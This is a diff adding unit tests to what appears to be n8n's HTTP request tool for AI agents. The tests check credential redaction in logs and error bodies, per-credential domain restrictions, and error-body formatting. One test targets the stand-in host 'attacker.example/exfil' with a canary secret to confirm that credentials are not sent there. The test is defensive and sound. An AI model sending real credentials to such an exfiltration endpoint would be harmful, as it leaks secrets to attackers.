@@ -1,5 +1,5 @@
-import type { INode, ISupplyDataFunctions } from 'n8n-workflow';
-import { jsonParse } from 'n8n-workflow';
+import type { INode, ISupplyDataFunctions, JsonObject } from 'n8n-workflow';
+import { NodeApiError, jsonParse } from 'n8n-workflow';
 import { mock } from 'vitest-mock-extended';
 
 import type { N8nTool } from '@utils/N8nTool';
@@ -53,6 +53,10 @@ describe('ToolHttpRequest', () => {
 			expect(helpers.httpRequest).toHaveBeenCalled();
 			expect(res).toContain('error');
 			expect(res).toContain('Binary data is not supported');
+			expect(executeFunctions.logAiEvent).toHaveBeenCalledWith(
+				'ai-tool-called',
+				expect.stringContaining('Binary data is not supported'),
+			);
 		});
 
 		it('should return the response text when receiving a text response', async () => {
@@ -83,6 +87,42 @@ describe('ToolHttpRequest', () => {
 			const res = await (response as N8nTool).invoke({});
 			expect(helpers.httpRequest).toHaveBeenCalled();
 			expect(res).toEqual('Hello World');
+			expect(executeFunctions.logAiEvent).toHaveBeenCalledWith(
+				'ai-tool-called',
+				JSON.stringify({ query: '{}', response: 'Hello World' }),
+			);
+		});
+
+		it('should sanitize credential-shaped values in the tool-called event', async () => {
+			helpers.httpRequest.mockResolvedValue({
+				body: 'api_key: sk-live-abcdef123456',
+				headers: {
+					'content-type': 'text/plain',
+				},
+			});
+
+			executeFunctions.getNodeParameter.mockImplementation((paramName: string) => {
+				switch (paramName) {
+					case 'method':
+						return 'GET';
+					case 'url':
+						return 'https://httpbin.org/text/plain';
+					case 'options':
+						return {};
+					case 'placeholderDefinitions.values':
+						return [];
+					default:
+						return undefined;
+				}
+			});
+
+			const { response } = await httpTool.supplyData.call(executeFunctions, 0);
+
+			const res = await (response as N8nTool).invoke({});
+			expect(res).toBe('api_key: sk-live-abcdef123456');
+			const payload = executeFunctions.logAiEvent.mock.calls[0][1];
+			expect(payload).toContain('api_key: [REDACTED]');
+			expect(payload).not.toContain('sk-live-abcdef123456');
 		});
 
 		it('should return the response text when receiving a text response with a charset', async () => {
@@ -238,6 +278,120 @@ describe('ToolHttpRequest', () => {
 			);
 		});
 
+		it('should apply Simplified Custom Auth through credential authentication', async () => {
+			helpers.httpRequestWithAuthentication.mockResolvedValue({
+				body: 'Hello World',
+				headers: { 'content-type': 'text/plain' },
+			});
+
+			executeFunctions.getNodeParameter.mockImplementation((paramName: string) => {
+				switch (paramName) {
+					case 'method':
+						return 'GET';
+					case 'url':
+						return 'https://api.example.com/data';
+					case 'authentication':
+						return 'genericCredentialType';
+					case 'genericAuthType':
+						return 'httpTemplatedCustomAuth';
+					case 'options':
+						return {};
+					case 'placeholderDefinitions.values':
+						return [];
+					default:
+						return undefined;
+				}
+			});
+			executeFunctions.getCredentials.mockResolvedValue({
+				template: JSON.stringify({ headers: { Authorization: 'Bearer {{api_key}}' } }),
+				placeholderValues: JSON.stringify({ api_key: 'secret' }),
+			});
+
+			const { response } = await httpTool.supplyData.call(executeFunctions, 0);
+			const result = await (response as N8nTool).invoke({});
+
+			expect(result).toBe('Hello World');
+			expect(helpers.httpRequestWithAuthentication).toHaveBeenCalledWith(
+				'httpTemplatedCustomAuth',
+				expect.objectContaining({ url: 'https://api.example.com/data' }),
+			);
+		});
+
+		it('should not send generic credentials to a domain the credential restricts', async () => {
+			executeFunctions.getNodeParameter.mockImplementation((paramName: string) => {
+				switch (paramName) {
+					case 'method':
+						return 'GET';
+					case 'url':
+						return 'http://attacker.example/exfil';
+					case 'authentication':
+						return 'genericCredentialType';
+					case 'genericAuthType':
+						return 'httpHeaderAuth';
+					case 'options':
+						return {};
+					case 'placeholderDefinitions.values':
+						return [];
+					default:
+						return undefined;
+				}
+			});
+
+			executeFunctions.getCredentials.mockResolvedValue({
+				name: 'X-Secret-Token',
+				value: 'SECRET-TOOLHTTP-CANARY',
+				allowedHttpRequestDomains: 'domains',
+				allowedDomains: 'api.example.com',
+			});
+
+			const { response } = await httpTool.supplyData.call(executeFunctions, 0);
+			const res = await (response as N8nTool).invoke({});
+
+			expect(helpers.httpRequest).not.toHaveBeenCalled();
+			expect(res).toContain('Domain not allowed');
+		});
+
+		it('should send generic credentials to a domain the credential allows', async () => {
+			helpers.httpRequest.mockResolvedValue({
+				body: 'Hello World',
+				headers: { 'content-type': 'text/plain' },
+			});
+
+			executeFunctions.getNodeParameter.mockImplementation((paramName: string) => {
+				switch (paramName) {
+					case 'method':
+						return 'GET';
+					case 'url':
+						return 'https://api.example.com/data';
+					case 'authentication':
+						return 'genericCredentialType';
+					case 'genericAuthType':
+						return 'httpHeaderAuth';
+					case 'options':
+						return {};
+					case 'placeholderDefinitions.values':
+						return [];
+					default:
+						return undefined;
+				}
+			});
+
+			executeFunctions.getCredentials.mockResolvedValue({
+				name: 'X-Secret-Token',
+				value: 'SECRET-TOOLHTTP-CANARY',
+				allowedHttpRequestDomains: 'domains',
+				allowedDomains: 'api.example.com',
+			});
+
+			const { response } = await httpTool.supplyData.call(executeFunctions, 0);
+			const res = await (response as N8nTool).invoke({});
+
+			expect(helpers.httpRequest).toHaveBeenCalledWith(
+				expect.objectContaining({ allowedDomains: 'api.example.com' }),
+			);
+			expect(res).toEqual('Hello World');
+		});
+
 		it('should return the error when receiving text that contains a null character', async () => {
 			helpers.httpRequest.mockResolvedValue({
 				body: 'Hello\0World',
@@ -357,6 +511,315 @@ describe('ToolHttpRequest', () => {
 			expect(res).toEqual(
 				JSON.stringify(['<h1>Test</h1> <div> <p> Test content </p> </div>'], null, 2),
 			);
+		});
+	});
+
+	describe('Error responses', () => {
+		beforeEach(() => {
+			executeFunctions.getNodeParameter.mockImplementation(
+				(paramName: string, _: any, fallback: any) => {
+					switch (paramName) {
+						case 'method':
+							return 'GET';
+						case 'url':
+							return 'https://httpbin.org/status';
+						case 'options':
+							return {};
+						case 'placeholderDefinitions.values':
+							return [];
+						default:
+							return fallback;
+					}
+				},
+			);
+		});
+
+		const invokeTool = async () => {
+			const { response } = await httpTool.supplyData.call(executeFunctions, 0);
+			return await (response as N8nTool).invoke({});
+		};
+
+		it('should include the response body when the request fails with a 4xx', async () => {
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('Request failed with status code 403'), {
+					response: {
+						status: 403,
+						data: { error: 'insufficient_scope', required: 'read:users' },
+					},
+				}),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('HTTP 403');
+			expect(res).toContain('insufficient_scope');
+			expect(res).toContain('read:users');
+		});
+
+		it('should include the response body when the request fails with a 5xx', async () => {
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('Request failed with status code 503'), {
+					response: { status: 503, data: 'Upstream database is unavailable' },
+				}),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('HTTP 503');
+			expect(res).toContain('Upstream database is unavailable');
+		});
+
+		it('should read the response body from the cause when the error is wrapped', async () => {
+			const cause = Object.assign(new Error('Request failed with status code 422'), {
+				response: { status: 422, data: { message: 'The "email" field is required' } },
+			});
+
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('Unprocessable Entity'), { httpCode: '422', cause }),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('HTTP 422');
+			expect(res).toContain('email');
+			expect(res).toContain('field is required');
+		});
+
+		it('should report the error alone when the request failed without a response', async () => {
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('connect ECONNREFUSED 127.0.0.1:443'), { code: 'ECONNREFUSED' }),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('There was an error');
+			expect(res).toContain('ECONNREFUSED');
+			expect(res).not.toContain('Response body');
+		});
+
+		it('should not add a response body section when the error response is empty', async () => {
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('Request failed with status code 404'), {
+					response: { status: 404, data: '' },
+				}),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('HTTP 404');
+			expect(res).not.toContain('Response body');
+		});
+
+		it('should read the response body reported by the legacy request helper', async () => {
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('Forbidden'), {
+					statusCode: 403,
+					error: { error: 'insufficient_scope' },
+					response: { status: 403, headers: {}, statusText: 'Forbidden' },
+				}),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('HTTP 403');
+			expect(res).toContain('insufficient_scope');
+		});
+
+		it('should derive the status code from the wrapped error when the wrapper has none', async () => {
+			const cause = Object.assign(new Error('Request failed with status code 429'), {
+				response: { status: 429, data: 'Rate limit exceeded' },
+			});
+
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('Too Many Requests'), { httpCode: null, cause }),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('HTTP 429');
+			expect(res).toContain('Rate limit exceeded');
+		});
+
+		it('should truncate an oversized error body', async () => {
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('Internal Server Error'), {
+					response: { status: 500, data: 'x'.repeat(5000) },
+				}),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('[truncated]');
+			expect(res.length).toBeLessThan(3000);
+		});
+
+		it('should skip a binary error body', async () => {
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('Internal Server Error'), {
+					response: { status: 500, data: Buffer.from([0x89, 0x50, 0x4e, 0x47]) },
+				}),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('HTTP 500');
+			expect(res).not.toContain('Response body');
+		});
+
+		it('should not throw when the error body cannot be serialized', async () => {
+			const circular: Record<string, unknown> = { message: 'Bad Request' };
+			circular.self = circular;
+
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('Bad Request'), {
+					response: { status: 400, data: circular },
+				}),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('HTTP 400');
+			expect(res).not.toContain('Response body');
+		});
+
+		it('should not repeat the body when it is already part of the error message', async () => {
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('403 - forbidden by policy'), {
+					response: { status: 403, data: 'forbidden by policy' },
+				}),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('forbidden by policy');
+			expect(res).not.toContain('Response body');
+		});
+
+		it('should redact credential values echoed back in the error body', async () => {
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('Unauthorized'), {
+					response: {
+						status: 401,
+						data: {
+							message: 'Rejected request',
+							api_key: 'sk-live-abcdef123456',
+							authorization: 'Bearer eyJhbGciOiJIUzI1NiJ9',
+						},
+					},
+				}),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('HTTP 401');
+			// The key stays so the model still learns which credential was rejected.
+			expect(res).toContain('api_key');
+			expect(res).toContain('Rejected request');
+			expect(res).not.toContain('sk-live-abcdef123456');
+			expect(res).not.toContain('eyJhbGciOiJIUzI1NiJ9');
+		});
+
+		it('should redact compound credential keys and unprefixed authorization values', async () => {
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('Unauthorized'), {
+					response: {
+						status: 401,
+						data: {
+							message: 'Token exchange failed',
+							client_secret: 'cs-live-abcdef',
+							Authorization: 'abcdef-bare-key',
+							token_type: 'Bearer',
+						},
+					},
+				}),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('Token exchange failed');
+			expect(res).toContain('client_secret');
+			expect(res).not.toContain('cs-live-abcdef');
+			expect(res).not.toContain('abcdef-bare-key');
+			// Keys that merely read like credentials keep their value.
+			expect(res).toContain('"token_type": "Bearer"');
+		});
+
+		it('should redact a credential the client folded into the error message', async () => {
+			helpers.httpRequest.mockRejectedValue(
+				Object.assign(new Error('401 - {"client_secret":"cs-live-abcdef"}'), {
+					response: { status: 401, data: '{"client_secret":"cs-live-abcdef"}' },
+				}),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('HTTP 401');
+			expect(res).toContain('client_secret');
+			expect(res).not.toContain('cs-live-abcdef');
+			// Both sides are redacted, so the body is still recognised as a repeat of the message.
+			expect(res).not.toContain('Response body');
+		});
+
+		it('should include the response body when a predefined credential wraps the failure', async () => {
+			// A tool authenticated with a stored credential goes through
+			// `httpRequestWithAuthentication`, which rejects with a real `NodeApiError` rather than
+			// the client's own error. That wrapper keeps the payload somewhere else entirely.
+			executeFunctions.getNodeParameter.mockImplementation(
+				(paramName: string, _: any, fallback: any) => {
+					switch (paramName) {
+						case 'method':
+							return 'GET';
+						case 'url':
+							return 'https://httpbin.org/status';
+						case 'authentication':
+							return 'predefinedCredentialType';
+						case 'nodeCredentialType':
+							return 'slackApi';
+						case 'options':
+							return {};
+						case 'placeholderDefinitions.values':
+							return [];
+						default:
+							return fallback;
+					}
+				},
+			);
+
+			// `NodeApiError` recognises an axios rejection by `constructor.name`, so the fixture
+			// carries that name to take the same branch production does.
+			class AxiosError extends Error {
+				isAxiosError = true;
+
+				response = {
+					status: 403,
+					data: { error: 'insufficient_scope', required: 'read:users' },
+				};
+			}
+
+			helpers.httpRequestWithAuthentication.mockRejectedValue(
+				new NodeApiError(
+					executeFunctions.getNode(),
+					new AxiosError('Request failed with status code 403') as unknown as JsonObject,
+				),
+			);
+
+			const res = await invokeTool();
+
+			expect(res).toContain('HTTP 403');
+			expect(res).toContain('insufficient_scope');
+			expect(res).toContain('read:users');
+		});
+
+		it('should leave successful responses untouched', async () => {
+			helpers.httpRequest.mockResolvedValue({
+				body: 'Hello World',
+				statusCode: 200,
+				headers: { 'content-type': 'text/plain' },
+			});
+
+			const res = await invokeTool();
+
+			expect(res).toEqual('Hello World');
 		});
 	});
 });
